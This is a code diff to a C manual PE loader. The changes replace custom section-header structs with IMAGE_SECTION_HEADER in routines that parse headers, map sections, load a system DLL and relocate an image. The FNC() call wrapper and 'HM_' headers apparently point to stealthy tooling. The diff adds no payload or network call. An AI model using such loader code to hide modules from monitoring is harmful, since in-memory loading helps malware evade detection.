@@ -3,7 +3,7 @@
 #include "HM_SafeProcedures.h"
 #include "common.h"
 
-static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH, SectionHeader **outSecHdr)
+static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH, IMAGE_SECTION_HEADER**outSecHdr)
 {
 	IMAGE_DOS_HEADER *mzH;
 	mzH = (IMAGE_DOS_HEADER*)modulePos;
@@ -20,7 +20,7 @@ static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE
 	PE_ExtHeader *peXH;
 	peXH = (PE_ExtHeader *)((char *)peH + sizeof(PE_Header));
 
-	SectionHeader *secHdr = (SectionHeader *)((char *)peXH + sizeof(PE_ExtHeader));
+	IMAGE_SECTION_HEADER *secHdr = (IMAGE_SECTION_HEADER*)((char *)peXH + sizeof(PE_ExtHeader));
 
 	*outMZ = *mzH;
 	*outPE = *peH;
@@ -37,7 +37,7 @@ static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE
 //*******************************************************************************************************
 
 int calcTotalImageSize(IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
-					   SectionHeader *inSecHdr)
+					   IMAGE_SECTION_HEADER *inSecHdr)
 {
 	int result = 0;
 	int alignment = inpeXH->sectionAlignment;
@@ -52,13 +52,13 @@ int calcTotalImageSize(IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader *in
 	}
 	for(int i = 0; i < inPE->numSections; i++)
 	{
-		if(inSecHdr[i].virtualSize)
+		if(inSecHdr[i].Misc.VirtualSize)
 		{
-			if(inSecHdr[i].virtualSize % alignment == 0)
-				result += inSecHdr[i].virtualSize;
+			if(inSecHdr[i].Misc.VirtualSize % alignment == 0)
+				result += inSecHdr[i].Misc.VirtualSize;
 			else
 			{
-				int val = inSecHdr[i].virtualSize / alignment;
+				int val = inSecHdr[i].Misc.VirtualSize / alignment;
 				val++;
 				result += (val * alignment);
 			}
@@ -92,7 +92,7 @@ ULONG getAlignedSize(unsigned long curSize, unsigned long alignment)
 //*******************************************************************************************************
 
 BOOL loadPE(char *exePtr, IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
-			SectionHeader *inSecHdr, LPVOID ptrLoc)
+			IMAGE_SECTION_HEADER *inSecHdr, LPVOID ptrLoc)
 {
 	char *outPtr = (char *)ptrLoc;
 
@@ -101,15 +101,15 @@ BOOL loadPE(char *exePtr, IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader 
 
 	for(int i = 0; i < inPE->numSections; i++)
 	{
-		if(inSecHdr[i].sizeOfRawData > 0)
+		if(inSecHdr[i].SizeOfRawData > 0)
 		{
-			unsigned long toRead = inSecHdr[i].sizeOfRawData;
-			if(toRead > inSecHdr[i].virtualSize)
-				toRead = inSecHdr[i].virtualSize;
+			unsigned long toRead = inSecHdr[i].SizeOfRawData;
+			if(toRead > inSecHdr[i].Misc.VirtualSize)
+				toRead = inSecHdr[i].Misc.VirtualSize;
 
-			memcpy(outPtr, exePtr + inSecHdr[i].pointerToRawData, toRead);
+			memcpy(outPtr, exePtr + inSecHdr[i].PointerToRawData, toRead);
 
-			outPtr += getAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
+			outPtr += getAlignedSize(inSecHdr[i].Misc.VirtualSize, inpeXH->sectionAlignment);
 		}
 	}
 
@@ -129,7 +129,7 @@ LPVOID loadDLL(char *dllName)
 	IMAGE_DOS_HEADER mzH2;
 	PE_Header peH2;
 	PE_ExtHeader peXH2;
-	SectionHeader *secHdr2;
+	IMAGE_SECTION_HEADER *secHdr2;
 
 	FNC(GetSystemDirectoryA)(moduleFilename, MAX_PATH);
 	if((myStrlenA(moduleFilename) + myStrlenA(dllName)) >= MAX_PATH)
@@ -276,7 +276,7 @@ BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
 	IMAGE_DOS_HEADER mzH2;
 	PE_Header peH2;
 	PE_ExtHeader peXH2;
-	SectionHeader *secHdr2;
+	IMAGE_SECTION_HEADER *secHdr2;
 
 	if (!exeAddr || !newAddr)
 		return FALSE;
@@ -295,11 +295,11 @@ BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
 			DWORD flags = 0;
 
 			for(int j = 0; j < peH2.numSections; j++){
-				if(peXH2.imageBase + fixBlk->pageRVA >= peXH2.imageBase + secHdr2[j].virtualAddress &&
-					peXH2.imageBase + fixBlk->pageRVA < peXH2.imageBase + secHdr2[j].virtualAddress +
-					secHdr2[j].virtualSize){
+				if(peXH2.imageBase + fixBlk->pageRVA >= peXH2.imageBase + secHdr2[j].VirtualAddress&&
+					peXH2.imageBase + fixBlk->pageRVA < peXH2.imageBase + secHdr2[j].VirtualAddress +
+					secHdr2[j].Misc.VirtualSize){
 
-						flags = secHdr2[j].characteristics;
+						flags = secHdr2[j].Characteristics;
 						break;
 				}
 				flags = 0;
